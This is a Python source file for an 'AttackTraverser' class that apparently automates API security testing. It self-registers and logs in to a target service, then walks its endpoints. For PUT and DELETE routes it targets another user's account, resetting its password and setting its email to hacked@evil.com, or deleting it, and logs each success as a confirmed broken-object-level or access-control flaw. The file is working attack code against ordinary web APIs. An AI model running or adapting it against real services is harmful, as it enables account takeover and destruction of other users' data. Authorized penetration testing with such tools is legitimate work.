# traverser.py
import requests
from logger_config import log

class AttackTraverser:
    def __init__(self, graph, target_host, knowledge_base):
        self.graph = graph
        self.target_host = target_host
        self.knowledge_base = knowledge_base
        self.headers = {'Content-Type': 'application/json'}
        self.found_vulns = []

    def auto_register(self):
        log.info("--- [INIT] Auto-Registration ---")
        register_url = f"{self.target_host}/users/v1/register"
        payload = self.knowledge_base

        try:
            r = requests.post(register_url, json=payload)
            if r.status_code == 200:
                log.info(f"[+] User '{payload['username']}' registered successfully.")
                return True
            else:
                log.warning(f"Registration skipped. Server said: {r.text}")
                return False
        except Exception as e:
            log.error(f"Registration Error: {e}")
            return False

    def login(self):
        self.auto_register()

        log.info("--- [INIT] Authenticating ---")
        login_url = f"{self.target_host}/users/v1/login"
        payload = {
            "username": self.knowledge_base["username"],
            "password": self.knowledge_base["password"]
        }

        try:
            r = requests.post(login_url, json=payload)
            if r.status_code == 200:
                data = r.json()
                token = data.get('auth_token') or data.get('token')
                if token:
                    self.headers['Authorization'] = f"Bearer {token}"
                    log.info(f"Login Successful! Token: {token[:10]}...")
                    return True
            log.error(f"Login Failed. Response: {r.text}")
            return False
        except Exception as e:
            log.error(f"Login Connection Error: {e}")
            return False

    def run_dfs(self, start_node):
        log.info(f"Starting traversal from {start_node}...")
        neighbors = list(self.graph.neighbors(start_node))
        
        for neighbor in neighbors:
            method, path = neighbor.split("\n", 1)
            
            victim_user = "hacker"
            
            if method in ["PUT", "DELETE"]:
                real_path = path.replace("{username}", victim_user)
                attack_desc = f"Attacking VICTIM ({victim_user})"
            else:
                real_path = path.replace("{username}", self.knowledge_base["username"])
                attack_desc = "Standard request"
            
            target_url = f"{self.target_host}{real_path}"
            log.info(f"--> {method} {real_path} [{attack_desc}]")
            
            try:
                if method == "PUT":
                    payload = {"password": "hacked_password_FINAL", "email": "hacked@evil.com"}
                    r = requests.put(target_url, json=payload, headers=self.headers)
                    
                    if r.status_code in [200, 204]:
                        msg = f"[BOLA] Successfully modified account of '{victim_user}' on {real_path}"
                        log.critical(f"    [!!!] VULNERABILITY CONFIRMED: {msg}")
                        self.found_vulns.append(msg)
                    else:
                        log.info(f"    Status: {r.status_code}")
                        
                elif method == "DELETE":
                    r = requests.delete(target_url, headers=self.headers)
                    if r.status_code in [200, 204]:
                        msg = f"[BAC] Successfully deleted account of '{victim_user}'"
                        log.critical(f"    [!!!] VULNERABILITY CONFIRMED: {msg}")
                        self.found_vulns.append(msg)
                    else:
                        log.info(f"    Status: {r.status_code}")

            except Exception as e:
                log.error(f"    Error: {e}")